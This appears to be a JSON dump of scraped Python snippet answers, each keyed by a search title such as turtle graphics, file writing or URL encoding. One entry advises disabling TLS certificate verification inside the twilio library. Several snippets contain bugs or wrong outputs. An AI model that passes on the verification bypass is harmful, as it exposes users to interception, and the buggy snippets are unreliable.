    "description": "t=Turtle() t.speed()\nturtle.write(arg, move=False, align=\"left\", font=(\"Arial\", 8, \"normal\"))\nturtle.setheading(direction) #set the direction for turtle\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3983,
    "keyword": null,
    "link": null,
    "title": " python turtle square",
    "description": "import turtle  turtle.forward(50) turtle.left(90) turtle.forward(50) turtle.left(90) turtle.forward(50) turtle.left(90) turtle.forward(50) turtle.left(90) \n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3984,
    "keyword": null,
    "link": null,
    "title": " python turtle window not responding",
    "description": "win = turtle.Screen()  while True:   win.update()\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3985,
    "keyword": null,
    "link": null,
    "title": " python twilio certificate error",
    "description": "go to: Python\\Python37\\Lib\\site-packages\\twilio\\http   open http_client.py and add a line after (self.session.mount....):     self.session.verify = False\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3986,
    "keyword": null,
    "link": null,
    "title": " python two number common division",
    "description": "import math  def notRelprime(a,b):     if a != 1 and b != 1:         if a%1==a%2==0 and b%1==b%2==0 or b%a == 0 or a%b == 0:             print(\"true\")             return True         else:             print(\"false\")             return False     else:         print(\"false\")         return False notRelprime(3,7)\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3987,
    "keyword": null,
    "link": null,
    "title": " python two while loops at same time",
    "description": "import threading import time  def infiniteloop1():     while True:         print('Loop 1')         time.sleep(1)  def infiniteloop2():     while True:         print('Loop 2')         time.sleep(1)  thread1 = threading.Thread(target=infiniteloop1) thread1.start()  thread2 = threading.Thread(target=infiniteloop2) thread2.start() \n",
    "reg_date": "2021-10-12T11:34:23.000Z"
  },
  {
    "id": 3988,
    "keyword": null,
    "link": null,
    "title": " python type for loop",
    "description": "key: str for key in cache:   \tprint(key)\n",
    "reg_date": "2021-10-12T11:34:23.000Z"
  },
  {
    "id": 3989,
    "keyword": null,
    "link": null,
    "title": " python type hint for a string",
    "description": "# Use \": str\" after an argument name # Use \" -> str\" in the function header before the ending colon def greeting(name: str) -> str:     return 'Hello, ' + name \n",
    "reg_date": "2021-10-12T11:34:23.000Z"
  },
  {
    "id": 3990,
    "keyword": null,
    "link": null,
    "title": " python type on keyboard",
    "description": "# in command prompt, type \"pip install pynput\" to install pynput. from pynput.keyboard import Key, Controller  keyboard = Controller() key = \"a\"  keyboard.press(key) keyboard.release(key)\nimport pyautogui  # Holds down the alt key pyautogui.keyDown(\"alt\")  # Presses the tab key once pyautogui.press(\"tab\")  # Lets go of the alt key pyautogui.keyUp(\"alt\")\npip install keyboard  import keyboard  keyboard.press_and_release('shift+s, space')  keyboard.write('The quick brown fox jumps over the lazy dog.')  keyboard.add_hotkey('ctrl+shift+a', print, args=('triggered', 'hotkey'))  # Press PAGE UP then PAGE DOWN to type \"foobar\". keyboard.add_hotkey('page up, page down', lambda: keyboard.write('foobar'))  # Blocks until you press esc. keyboard.wait('esc')  # Record events until 'esc' is pressed. recorded = keyboard.record(until='esc') # Then replay back at three times the speed. keyboard.play(recorded, speed_factor=3)  # Type @@ then press space to replace with abbreviation. keyboard.add_abbreviation('@@', 'my.long.email@example.com')  # Block forever, like `while True`. keyboard.wait()\n",
    "reg_date": "2021-10-12T11:34:23.000Z"
  },
  {
    "id": 3991,
    "keyword": null,
    "link": null,
    "title": " python typed list",
    "description": "from typing import List  to_addresses: List[str] \nfrom typing import List  def my_func(l: List[int]):     pass \n# For collections, the name of the type is capitalized, and the # name of the type inside the collection is in brackets x: List[int] = [1] x: Set[int] = {6, 7}    # For simple built-in types, just use the name of the type x: int = 1 x: float = 1.0 x: bool = True x: str = \"test\" x: bytes = b\"test\"\n",
    "reg_date": "2021-10-12T11:34:23.000Z"
  },
  {
    "id": 3992,
    "keyword": null,
    "link": null,
    "title": " python typing as int or float",
    "description": "from typing import Union # Usage: Union[type1, type2]  # Exemple: weight : Union[int, float] # or def return_triple( number : Union[int, float]) -> Union[int, float]: \treturn number*2\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3993,
    "keyword": null,
    "link": null,
    "title": " python typing effect",
    "description": "from time import sleep import sys  string = \"The Battle Cats For Life\" # Whatever string you want  for letter in string:   sleep(0.01) # In seconds   sys.stdout.write(letter)   sys.stdout.flush()\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3994,
    "keyword": null,
    "link": null,
    "title": " python ubuntu check if a key is pressed",
    "description": "import keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3995,
    "keyword": null,
    "link": null,
    "title": " python unlist flatten nested lists",
    "description": "def flatten(x):     if isinstance(x, list):         return [a for i in x for a in flatten(i)]     else:         return [x]\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3996,
    "keyword": null,
    "link": null,
    "title": " python update pip3",
    "description": "pip3 install --upgrade pip\npip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3997,
    "keyword": null,
    "link": null,
    "title": " python upgrade pip scipy",
    "description": "sudo pip install --upgrade scipy \n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3998,
    "keyword": null,
    "link": null,
    "title": " python url encoding",
    "description": ">>> import urllib >>> f = { 'eventName' : 'myEvent', 'eventDescription' : 'cool event'} >>> urllib.urlencode(f) 'eventName=myEvent&eventDescription=cool+event' \n#Python3 import urllib print (urllib.parse.quote('gitlab/gith', safe='')) >>> gitlab%Fgith\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 3999,
    "keyword": null,
    "link": null,
    "title": " python url join",
    "description": ">>> from urllib.parse import urljoin >>> urljoin('/media/path/', 'js/foo.js') '/media/path/js/foo.js' \nfrom urllib.parse import urlparse, parse_qs URL='https://someurl.com/with/query_string?i=main&mode=front&sid=12ab&enc=+Hello' parsed_url = urlparse(URL) parse_qs(parsed_url.query)\n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 4000,
    "keyword": null,
    "link": null,
    "title": " python urlencode",
    "description": ">>> import urllib >>> f = { 'eventName' : 'myEvent', 'eventDescription' : 'cool event'} >>> urllib.urlencode(f) 'eventName=myEvent&eventDescription=cool+event' \nimport urllib.parse query = 'Hell&ouml; W&ouml;rld@Python' print(urllib.parse.quote(query))  >> 'Hellö Wörld@Python'\n>>> from urllib.parse import urljoin >>> urljoin('/media/path/', 'js/foo.js') '/media/path/js/foo.js' \n#Python3 import urllib print (urllib.parse.quote('gitlab/gith', safe='')) >>> gitlab%Fgith\n>>> urllib.parse.urlparse(\"http://example.com/pa/th;param1=foo;param2=bar?name=val#frag\") ParseResult(scheme='http', netloc='example.com', path='/pa/th', params='param1=foo;param2=bar', query='name=val', fragment='frag') \n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 4001,
    "keyword": null,
    "link": null,
    "title": " python urlencode with requests",
    "description": ">>> import requests >>> requests.utils.quote('test+user@gmail.com') 'test+user@gmail.com' \n",
    "reg_date": "2021-10-12T11:34:24.000Z"
  },
  {
    "id": 4002,
    "keyword": null,
    "link": null,
    "title": " python urllib3 download file",
    "description": "import requests  print('Beginning file download with requests')  url = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg' r = requests.get(url)  with open('/Users/scott/Downloads/cat3.jpg', 'wb') as f:     f.write(r.content)  # Retrieve HTTP meta-data print(r.status_code) print(r.headers['content-type']) print(r.encoding) \n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4003,
    "keyword": null,
    "link": null,
    "title": " python use tqdm with concurrent futures",
    "description": "import concurrent.futures import tqdm  work_list = list(range(32768))   def calc(x):     return x ** x   with concurrent.futures.ProcessPoolExecutor() as executor:     list(tqdm.tqdm(executor.map(calc, work_list), total=len(work_list)))\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4004,
    "keyword": null,
    "link": null,
    "title": " python valeur de pi",
    "description": "#Importer la fonction pi du module math from math import pi  #Afficher la valeur de pi via la fonction print print(pi)\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4005,
    "keyword": null,
    "link": null,
    "title": " python vernam cipher",
    "description": "vernam_dict = dict((i, chr(i + 96)) for i in range(1, 27)) # Vernam by replacing char of plain by char(ord(sum of plain and key)) def vernam_encrypt(plain, key):     plain = plain.lower()     ckey = ''.join([(key[i % len(key)]) for i in range(len(list(plain)))])     print(ckey)     cipher = ''     for i in range(len(plain)):         if plain[i] == ' ':             cipher += ' '         else:             cipher += vernam_dict[(ord(plain[i]) + ord(ckey[i])) % 26]     print(cipher, plain)  print(vernam_encrypt('mountains are bae', 'hello'))  def vernam_decrypt(ctext, key):     cupper = ctext.upper()     text_num = [letters.index(u) for u in cupper]     intm_key = [letters.index(ik) for ik in key]     c = ''     for i in range(len(cupper)):         ee = text_num[i] - intm_key[i]         if ee < 0:             c += letters[ee + 26]         else:             c += letters[ee]     return c    print(vernam_decrypt('BSJDE', 'UOYSQ'))\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4006,
    "keyword": null,
    "link": null,
    "title": " python version command",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# in python $ python --version  # in python3 $ python3 --version\nimport sys print(sys.version)\npython --version\npython &ndash;&ndash;version\npython -V \n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4007,
    "keyword": null,
    "link": null,
    "title": " python version kali linux",
    "description": "$ python2 --version or $ python --version\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4008,
    "keyword": null,
    "link": null,
    "title": " python virus",
    "description": "# what are you trying to do...\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4009,
    "keyword": null,
    "link": null,
    "title": " python volver al principio",
    "description": "print(\"Hola\")\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4010,
    "keyword": null,
    "link": null,
    "title": " python wait 1 sec",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \nimport time while True:     print(\"This prints once a minute.\")     time.sleep(60) # Delay for 1 minute (60 seconds).\nfrom time import sleep sleep(2)    print(\"hello world\")\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4011,
    "keyword": null,
    "link": null,
    "title": " python wait 5 seconds then display",
    "description": "from time import sleep sleep(2)    print(\"hello world\")\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4012,
    "keyword": null,
    "link": null,
    "title": " python wait until",
    "description": "import time def waitUntil(condition, output): #defines function     wU = True     while wU == True:         if condition: #checks the condition             output             wU = False         time.sleep(60) #waits 60s for preformance  waitUntil(Cookies >= 0, eatCookies()) #runs function (output MUST be another function)\n",
    "reg_date": "2021-10-12T11:34:25.000Z"
  },
  {
    "id": 4013,
    "keyword": null,
    "link": null,
    "title": " python watchgod",
    "description": "pip install watchdog pip3 install watchdog\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4014,
    "keyword": null,
    "link": null,
    "title": " python weather",
    "description": "# importing requests and json import requests, json # base URL BASE_URL = \"https://api.openweathermap.org/data/2.5/weather?\" # City Name CITY = \"Hyderabad\" # API key API_KEY = \"Your API Key\" # upadting the URL URL = BASE_URL + \"q=\" + CITY + \"&appid=\" + API_KEY # HTTP request response = requests.get(URL) # checking the status code of the request if response.status_code == 200:    # getting data in the json format    data = response.json()    # getting the main dict block    main = data['main']    # getting temperature    temperature = main['temp']    # getting the humidity    humidity = main['humidity']    # getting the pressure    pressure = main['pressure']    # weather report    report = data['weather']    print(f\"{CITY:-^30}\")    print(f\"Temperature: {temperature}\")    print(f\"Humidity: {humidity}\")    print(f\"Pressure: {pressure}\")    print(f\"Weather Report: {report[0]['description']}\") else:    # showing the error message    print(\"Error in the HTTP request\")\nimport pyowm owm = pyowm.OWM() observation = owm.weather_at_place('London,uk') w = observation.get_weather() w.get_wind() w.get_humidity() ################ # Run >>> {u'speed': 3.1, u'deg': 220} >>> 76 \n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4015,
    "keyword": null,
    "link": null,
    "title": " python webbrowser",
    "description": "import webbrowser webbrowser.open('https://www.google.co.uk/')\n#This code will give you free fortnite vbucks import webbrowser  for x in range(100):     webbrowser.open_new_tab(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO\"\") \nimport webbrowser url = 'https://www.python.org/' webbrowser.open_new_tab(url) webbrowser.open_new(url)\nimport webbrowser chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s' webbrowser.get(chrome_path).open('http://docs.python.org/')\nimport webbrowser as wb wb.register('chrome', None) wb.open(\"https://www.google.com/\") \n#Open google in python - Windows import webbrowser url='https://google.com' webbrowser.get('C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s').open(url)\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4016,
    "keyword": null,
    "link": null,
    "title": " python wget anaconda",
    "description": "conda install -c conda-forge python-wget\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4017,
    "keyword": null,
    "link": null,
    "title": " python what does yield do",
    "description": " To understand what yield does, you must understand what generators are. And before you can understand generators, you must understand iterables. Iterables  When you create a list, you can read its items one by one. Reading its items one by one is called iteration:  >>> mylist = [1, 2, 3] >>> for i in mylist: ...    print(i) 1 2 3  mylist is an iterable. When you use a list comprehension, you create a list, and so an iterable:  >>> mylist = [x*x for x in range(3)] >>> for i in mylist: ...    print(i) 0 1 4  Everything you can use \"for... in...\" on is an iterable; lists, strings, files...  These iterables are handy because you can read them as much as you wish, but you store all the values in memory and this is not always what you want when you have a lot of values. Generators  Generators are iterators, a kind of iterable you can only iterate over once. Generators do not store all the values in memory, they generate the values on the fly:  >>> mygenerator = (x*x for x in range(3)) >>> for i in mygenerator: ...    print(i) 0 1 4  It is just the same except you used () instead of []. BUT, you cannot perform for i in mygenerator a second time since generators can only be used once: they calculate 0, then forget about it and calculate 1, and end calculating 4, one by one. Yield  yield is a keyword that is used like return, except the function will return a generator.  >>> def createGenerator(): ...    mylist = range(3) ...    for i in mylist: ...        yield i*i ... >>> mygenerator = createGenerator() # create a generator >>> print(mygenerator) # mygenerator is an object! <generator object createGenerator at 0xb7555c34> >>> for i in mygenerator: ...     print(i) 0 1 4  Here it's a useless example, but it's handy when you know your function will return a huge set of values that you will only need to read once.  To master yield, you must understand that when you call the function, the code you have written in the function body does not run. The function only returns the generator object, this is a bit tricky :-)  Then, your code will continue from where it left off each time for uses the generator.  Now the hard part:  The first time the for calls the generator object created from your function, it will run the code in your function from the beginning until it hits yield, then it'll return the first value of the loop. Then, each subsequent call will run another iteration of the loop you have written in the function and return the next value. This will continue until the generator is considered empty, which happens when the function runs without hitting yield. That can be because the loop has come to an end, or because you no longer satisfy an \"if/else\".\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4018,
    "keyword": null,
    "link": null,
    "title": " python wikipedia",
    "description": "import wikipediaapi  wiki = wikipediaapi.Wikipedia(\"en\") page = wiki.page(\"Python (programming language)\")  print(page.summary) # Python is an interpreted, high-level and general-purpose programming language. Python's design philosophy emphasizes code readability with its notable use of significant indentation. Its # language constructs and object-oriented approach aim to help programmers write clear, logical code for small and large-scale projects. # Python is dynamically-typed and garbage-collected. It supports multiple programming paradigms, including structured (particularly, procedural), object-oriented and functional programming. # Python is often described as a \"batteries included\" language due to its comprehensive standard library.Guido van Rossum began working on Python in the late 1980\\'s, # as a successor to the ABC programming language, and first released it in 1991 as Python 0.9.1. Python 2.0 was released in 2000 and introduced new features, such as list comprehensions # and a garbage collection system using reference counting and was discontinued with version 2.7.18 in 2020. Python 3.0 was released in 2008 and was a major revision of the # language that is not completely backward-compatible and much Python 2 code does not run unmodified on Python 3. # Python consistently ranks as one of the most popular programming languages.\nDecember 1989 Python was conceived in the late 1980s by Guido van Rossum at Centrum Wiskunde & Informatica (CWI) in the Netherlands as a successor to the ABC language (itself inspired by SETL), capable of exception handling and interfacing with the Amoeba operating system. Its implementation began in December 1989.\n   Y   .-^-.  /     \\      .- ~ ~ -. ()     ()    /   _ _   `.                     _ _ _  \\_   _/    /  /     \\   \\                . ~  _ _  ~ .    | |     /  /       \\   \\             .' .~       ~-. `.    | |    /  /         )   )           /  /             `.`.    \\ \\_ _/  /         /   /           /  /                `'     \\_ _ _.'         /   /           (  (                     /   /             \\  \\                    /   /               \\  \\                   /   /                 )  )                  (   (                 /  /                   `.  `.             .'  /                     `.   ~ - - - - ~   .'                        ~ . _ _ _ _ . ~\nfrom _future_ import print_function import matplotlib.pyplot as plt import os import sys import re import gc  # Selection of features following \"Writing mathematical expresion\"tutorial mathtext_tiles = {     0: \"Header demo\"     1: \"Subscripts and superscripts\"     2: \"Fraction ,bionomals and stacked numbers\"     3: \"radicals\"     4: \"Fonts\"     5: \"Accents\"     6: \"Greek Herbew\"     7: \"Delimeters, functions and symbols\"} n_lines = len(mathtext_titles)\npip install wikipedia\n>>> import wikipedia >>> print wikipedia.summary(\"Wikipedia\") # Wikipedia (/ˌwɪkɨˈpiːdiə/ or /ˌwɪkiˈpiːdiə/ WIK-i-PEE-dee-ə) is a collaboratively edited, multilingual, free Internet encyclopedia supported by the non-profit Wikimedia Foundation...  >>> wikipedia.search(\"Barack\") # [u'Barak (given name)', u'Barack Obama', u'Barack (brandy)', u'Presidency of Barack Obama', u'Family of Barack Obama', u'First inauguration of Barack Obama', u'Barack Obama presidential campaign, 2008', u'Barack Obama, Sr.', u'Barack Obama citizenship conspiracy theories', u'Presidential transition of Barack Obama']  >>> ny = wikipedia.page(\"New York\") >>> ny.title # u'New York' >>> ny.url # u'http://en.wikipedia.org/wiki/New_York' >>> ny.content # u'New York is a state in the Northeastern region of the United States. New York is the 27th-most exten'... >>> ny.links[0] # u'1790 United States Census'  >>> wikipedia.set_lang(\"fr\") >>> wikipedia.summary(\"Facebook\", sentences=1) # Facebook est un service de r&eacute;seautage social en ligne sur Internet permettant d'y publier des informations (photographies, liens, textes, etc.) en contr&ocirc;lant leur visibilit&eacute; par diff&eacute;rentes cat&eacute;gories de personnes. \n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4019,
    "keyword": null,
    "link": null,
    "title": " python wikipediaapi",
    "description": "import wikipediaapi  wiki = wikipediaapi.Wikipedia(\"en\") page = wiki.page(\"Python (programming language)\")  print(page.summary) # Python is an interpreted, high-level and general-purpose programming language. Python's design philosophy emphasizes code readability with its notable use of significant indentation. Its # language constructs and object-oriented approach aim to help programmers write clear, logical code for small and large-scale projects. # Python is dynamically-typed and garbage-collected. It supports multiple programming paradigms, including structured (particularly, procedural), object-oriented and functional programming. # Python is often described as a \"batteries included\" language due to its comprehensive standard library.Guido van Rossum began working on Python in the late 1980\\'s, # as a successor to the ABC programming language, and first released it in 1991 as Python 0.9.1. Python 2.0 was released in 2000 and introduced new features, such as list comprehensions # and a garbage collection system using reference counting and was discontinued with version 2.7.18 in 2020. Python 3.0 was released in 2008 and was a major revision of the # language that is not completely backward-compatible and much Python 2 code does not run unmodified on Python 3. # Python consistently ranks as one of the most popular programming languages.\nimport wikipedia print wikipedia.summary(\"Wikipedia\") # Wikipedia (/ˌwɪkɨˈpiːdiə/ or /ˌwɪkiˈpiːdiə/ WIK-i-PEE-dee-ə) is a collaboratively edited, multilingual, free Internet encyclopedia supported by the non-profit Wikimedia Foundation...  wikipedia.search(\"Barack\") # [u'Barak (given name)', u'Barack Obama', u'Barack (brandy)', u'Presidency of Barack Obama', u'Family of Barack Obama', u'First inauguration of Barack Obama', u'Barack Obama presidential campaign, 2008', u'Barack Obama, Sr.', u'Barack Obama citizenship conspiracy theories', u'Presidential transition of Barack Obama']  ny = wikipedia.page(\"New York\") ny.title # u'New York' ny.url # u'http://en.wikipedia.org/wiki/New_York' ny.content # u'New York is a state in the Northeastern region of the United States. New York is the 27th-most exten'... ny.links[0] # u'1790 United States Census'  wikipedia.set_lang(\"fr\") wikipedia.summary(\"Facebook\", sentences=1) # Facebook est un service de r&eacute;seautage social en ligne sur Internet permettant d'y publier des informations (photographies, liens, textes, etc.) en contr&ocirc;lant leur visibilit&eacute; par diff&eacute;rentes cat&eacute;gories de personnes. \n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4020,
    "keyword": null,
    "link": null,
    "title": " python windows get file modified date",
    "description": "# note: test.txt can also be a file path import os.path, time print(\"Last modified: %s\" % time.ctime(os.path.getmtime(\"test.txt\"))) print(\"Created: %s\" % time.ctime(os.path.getctime(\"test.txt\")))\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4021,
    "keyword": null,
    "link": null,
    "title": " python windows hide files",
    "description": "import win32con, win32api file = 'myfile.txt' # can be any extension win32api.SetFileAttributes(file,win32con.FILE_ATTRIBUTE_HIDDEN) \n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4022,
    "keyword": null,
    "link": null,
    "title": " python windows notification",
    "description": "from win10toast import ToastNotifier toaster = ToastNotifier() toaster.show_toast(\"Sample Notification\",\"Python is awesome!!!\")\n# If win10toast is not installed on your machine open the command prompt and run # pip install win10toast # or # pip3 install win10toast from win10toast import ToastNotifier toaster = ToastNotifier() toaster.show_toast(\"Sample Notification\",\"Python is awesome!!!\")\n",
    "reg_date": "2021-10-12T11:34:26.000Z"
  },
  {
    "id": 4023,
    "keyword": null,
    "link": null,
    "title": " python windows take screenshot pil",
    "description": "import PIL.ImageGrab  im = PIL.ImageGrab.grab() im.show()\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4024,
    "keyword": null,
    "link": null,
    "title": " python wordcloud",
    "description": "from wordcloud import WordCloud, STOPWORDS import matplotlib.pyplot as plt  text = 'Python Kurs: mit Python programmieren lernen f&uuml;r Anf&auml;nger und Fortgeschrittene Dieses Python Tutorial entsteht im Rahmen von Uni-Kursen und kann hier kostenlos genutzt werden. Python ist eine f&uuml;r Anf&auml;nger und Einsteiger sehr gut geeignete Programmiersprache, die sp&auml;ter auch den Fortgeschrittenen und Profis alles bietet, was man sich beim Programmieren w&uuml;nscht. Der Kurs ist eine Einf&uuml;hrung und bietet einen guten Einstieg. Es wird aktuelles Wissen vermittelt - daher schreiben wir unseren Python-Code mit der aktuellen Python-Version 3. einfach Python lernen &uuml;ber das Programmieren von Spielen Damit Python programmieren lernen noch mehr Spa&szlig; macht, werden wir im Kurs anhand verschiedener Spiele die Anwendung von Python kennen lernen und unser Wissen als Programmierer aufbauen. Die Grundlagen werden direkt umgesetzt in bekannte Spiele wie:'  nichtinteressant = \"und von Der das den wir ist die auf im\" liste_der_unerwuenschten_woerter = nichtinteressant.split()  STOPWORDS.update(liste_der_unerwuenschten_woerter) wordcloud = WordCloud(background_color=\"white\").generate(text)  plt.imshow(wordcloud, interpolation=\"bilinear\") plt.axis(\"off\") plt.show() \n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4025,
    "keyword": null,
    "link": null,
    "title": " python write a dictionary to file",
    "description": "dictionary = {'someKey' : 'someValue'} file_path = 'somePathToFile/someFileName.py' with open(file_path, 'w') as output_file:     print(dictionary, file=output_file)\ndict = {'Python' : '.py', 'C++' : '.cpp', 'Java' : '.java'} f = open(\"dict.txt\",\"w\") f.write( str(dict) ) f.close()\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4026,
    "keyword": null,
    "link": null,
    "title": " python write a list to a file line by line",
    "description": "# attempt #1 f = open(\"Bills.txt\", \"w\") f.write(\"\\n\".join(map(lambda x: str(x), bill_List))) f.close()   # attempt #2 # Open a file in write mode f = open('Bills.txt', 'w') for item in bill_List: f.write(\"%s\\n\" % item) # Close opend file f.close()  # attempt #3  with open('Bills.txt', 'w') as f: for s in bill_List:     f.write(s + '\\n')  with open('Bills.txt', 'r') as f: bill_List = [line.rstrip('\\n') for line in f]  # attempt #4 with open('Bills.txt', 'w') as out_file: out_file.write('\\n'.join(     bill_List)) \n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4027,
    "keyword": null,
    "link": null,
    "title": " python write json to file utf8",
    "description": "open(jsonfile , \"w\", encoding=\"utf8\").write(json.dumps(file,indent=4, ensure_ascii=False))\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4028,
    "keyword": null,
    "link": null,
    "title": " python write to file",
    "description": "file = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \nwith open(\"hello.txt\", \"w\") as f: \tf.write(\"Hello World\") #using With Statement files opened will be closed automatically\nwith open(\"test.txt\",'w',encoding = 'utf-8') as f:    f.write(\"my first file\\n\")    f.write(\"This file\\n\\n\")    f.write(\"contains three lines\\n\")\nwith open(filename,\"w\") as f:   f.write('Hello World')\n# using 'with' block  with open(\"xyz.txt\", \"w\") as file: # xyz.txt is filename, w means write format   file.write(\"xyz\") # write text xyz in the file    # maunal opening and closing  f= open(\"xyz.txt\", \"w\") f.write(\"hello\") f.close()  # Hope you had a nice little IO lesson\npath = \"guide/README.txt\" # The path of your file should go here with open(path, \"w\") as fil: # Opens the file using 'w' method. See below for list of methods.   fil.write(\"This is the README. It is reccomended that you read it.\") # Writes to the file used .write() method   fil.close() # Closes file ''' List of methods: w* - replace everything with needed text r^ - read the file a* - adds to file x - creates file  * Creates file if the file at that path does not exist ^ Throws error if file does not exist '''  \n# open a file you can use the function open file = open(\"myFile.txt\", \"w\") #here we have \"open\", and that's the main function # that opens the file, next we have 2 arguments # FILENAME and OPENING MODE # in the filename argument you just have to write the file's location # or if the script is in that location just write the filename # in the opening mode you have to write in which mode you want # to open your file, i'll list some here: # \"w\" for writing to a file # \"r\" for reading to a file # \"r+\" for both reading and writing # \"a\" to append to a file #to write to the file use \"file.write\" file.write(\"This has been written by a program\") #and finally to close the file when you're done with it file.close() # hope this helped and remember that in \"w\" mode it #deletes the content of the file and replaces # it with a new one, if you want to add something # to a file use \"a\" mode\nwith open(\"testfile.txt\", \"w\") as f:   # \"w\" - write into file   # \"r\" - read into file   # \"+\" - read and write into file   f.write(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4029,
    "keyword": null,
    "link": null,
    "title": " python write to json with indent",
    "description": " import json  json_data = '[{\"ID\":10,\"Name\":\"Pankaj\",\"Role\":\"CEO\"},' \\             '{\"ID\":20,\"Name\":\"David Lee\",\"Role\":\"Editor\"}]'  json_object = json.loads(json_data)  json_formatted_str = json.dumps(json_object, indent=2)  print(json_formatted_str) \nimport json  # alphabetic dictionary json_data = {hex(k): chr(k) for k in range(ord('a'), ord('z') + 1)} # to file with open(\"my_json.json\", \"w\") as file:     json.dump(json_data, file, indent=4, sort_keys=True) \n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4030,
    "keyword": null,
    "link": null,
    "title": " python writelines",
    "description": "f = open(\"demofile3.txt\", \"a\") f.writelines([\"See you soon!\", \"Over and out.\"]) f.close()\nfw.write('\\n'.join(line_list) + '\\n')\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4031,
    "keyword": null,
    "link": null,
    "title": " python writelines newline",
    "description": "lines = ['line1', 'line2'] with open('filename.txt', 'w') as f:     f.writelines(\"%s\\n\" % l for l in lines)\nfw.write('\\n'.join(line_list) + '\\n')\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4032,
    "keyword": null,
    "link": null,
    "title": " python xml replace attribute value",
    "description": " Change XML Attribute using Python Solution: First we parse the xml file and perform the string contains operation to check if the title of the book contains &ldquo;Python&ldquo;. If the string contains the keyword, we use the set() method to change the attribute value\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4033,
    "keyword": null,
    "link": null,
    "title": " python year from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\nimport datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second)\n",
    "reg_date": "2021-10-12T11:34:27.000Z"
  },
  {
    "id": 4034,
    "keyword": null,
    "link": null,
    "title": " python year month day hour minute second",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n######################################################################## import datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second) ######################################################################## from datetime import * now = datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second) ########################################################################\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
